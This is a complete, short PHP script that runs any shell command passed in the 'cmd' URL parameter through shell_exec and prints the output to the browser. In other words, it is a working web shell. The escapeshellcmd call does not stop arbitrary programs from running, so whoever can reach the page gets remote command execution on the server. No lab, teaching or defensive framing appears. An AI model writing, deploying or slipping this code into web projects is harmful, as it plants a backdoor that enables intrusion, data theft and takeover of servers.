<?php
// Check if the user has submitted a command
if (isset($_GET['cmd'])) {
    // Get the command from the URL query parameter
    $command = escapeshellcmd($_GET['cmd']);

    // Execute the command and display the output
    $output = shell_exec($command);
    
    // Display the output
    echo "<pre>$output</pre>";
} else {
    // If no command is submitted, ask for a command
    echo "Please provide a command using the 'cmd' parameter.";
}
?>
